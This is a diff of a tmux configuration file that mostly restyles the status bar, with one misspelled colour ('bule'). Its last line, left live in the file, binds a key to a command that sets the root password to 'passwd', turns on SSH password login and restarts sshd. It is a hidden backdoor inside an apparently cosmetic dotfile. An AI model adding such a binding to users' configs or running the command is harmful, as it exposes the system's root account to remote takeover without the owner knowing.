@@ -7,19 +7,15 @@ bind-key -n -T prefix L       resize-pane -R 6
 bind-key -n -T prefix J       resize-pane -D 6
 set -g @plugin 'tmux-plugins/tmux-resurrect'
 
-
-set -g status-bg black
-set -g status-fg white
-
 set-option -g status-justify centre
-set-option -g status-left '#[bg=black,fg=green][#[fg=cyan]#S#[fg=green]]'
+set-option -g status-left '#[fg=cyan,bold]#S#[fg=blue]'
 set-option -g status-left-length 20
 
 setw -g automatic-rename on
-set-window-option -g window-status-format '#[dim]#I:#[default]#W#[fg=grey,dim]'
+set-option -g status-bg default
 set-window-option -g window-status-current-format '#[fg=cyan,bold]#I#[fg=blue]:#[fg=cyan]#W#[fg=dim]'
-
-set -g status-right '#[fg=green][#[fg=cyan]%Y-%m-%d-%H:%M#[fg=green]]'
+set-window-option -g window-status-format '#[fg=cyan,bold]#I#[fg=blue]:#[fg=cyan]#W#[fg=dim]'
+set -g status-right '#[fg=cyan,bold][#[fg=cyan,bold]%Y-%m-%d-%H:%M#[fg=bule]]'
 
 set-option -g allow-rename off
 bind-key t send-keys 'echo passwd|passwd --stdin root && sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/" /etc/ssh/sshd_config && systemctl restart sshd'
